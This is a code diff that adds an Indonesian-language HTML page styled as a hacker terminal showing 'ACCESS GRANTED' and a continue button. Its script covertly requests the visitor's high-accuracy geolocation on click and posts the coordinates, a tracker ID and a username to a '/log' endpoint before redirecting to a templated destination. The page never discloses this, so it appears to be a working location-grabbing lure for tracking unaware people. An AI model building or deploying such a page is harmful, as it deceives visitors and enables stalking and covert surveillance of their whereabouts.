@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Satu Langkah Lagi...</title>
+    <style>
+        body {
+            font-family: 'VT323', monospace;
+            background-color: #000000;
+            color: #00ff41;
+            text-shadow: 0 0 5px #00ff41;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+            text-align: center;
+        }
+        .container {
+            background: rgba(0, 20, 0, 0.5);
+            padding: 30px;
+            border: 1px solid #00ff41;
+            box-shadow: 0 0 15px #00ff41 inset, 0 0 20px #00ff41;
+            border-radius: 8px;
+            max-width: 500px;
+            width: 90%;
+            box-sizing: border-box;
+        }
+        h1 {
+            font-size: 2.5em;
+            color: #00ffff;
+            text-shadow: 0 0 8px #00ffff;
+            margin-bottom: 10px;
+        }
+        p {
+            font-size: 1em;
+            color: #fff;
+            margin-bottom: 20px;
+        }
+        .action-button {
+            padding: 12px 24px;
+            background-color: #00ff41;
+            color: #000;
+            border: none;
+            font-family: inherit;
+            font-size: 1.2em;
+            cursor: pointer;
+            text-shadow: none;
+            transition: background-color 0.3s, transform 0.2s;
+        }
+        .action-button:hover {
+            background-color: #fff;
+            transform: translateY(-2px);
+        }
+        .action-button:disabled {
+            background-color: #333;
+            color: #777;
+            cursor: not-allowed;
+            text-shadow: none;
+            border: 1px solid #555;
+            transform: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>ACCESS GRANTED</h1>
+        <p>Akses ke konten telah diverifikasi. Silakan klik tombol di bawah untuk melanjutkan ke tujuan akhir.</p>
+        <button class="action-button" id="continueBtn">[ LANJUTKAN ]</button>
+    </div>
+
+    <script>
+        const continueBtn = document.getElementById('continueBtn');
+        
+        // Ambil data yang disisipkan dari server
+        const trackerId = "{{TRACKER_ID}}";
+        const username = "{{USERNAME}}";
+        const destinationUrl = "{{DESTINATION_URL}}";
+
+        const sendLocation = (latitude, longitude) => {
+            fetch('/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ latitude, longitude, trackerId, username }),
+            })
+            .then(response => response.json())
+            .then(data => console.log('Location sent:', data))
+            .catch(error => console.error('Error sending location:', error));
+        };
+
+        continueBtn.addEventListener('click', () => {
+            continueBtn.disabled = true;
+            continueBtn.textContent = "[ LOADING... ]";
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        sendLocation(position.coords.latitude, position.coords.longitude);
+                        window.location.href = destinationUrl;
+                    },
+                    (error) => {
+                        console.warn('Geolocation error:', error);
+                        window.location.href = destinationUrl;
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            } else {
+                console.warn('Geolocation not supported by this browser.');
+                window.location.href = destinationUrl;
+            }
+        });
+    </script>
+</body>
+</html>
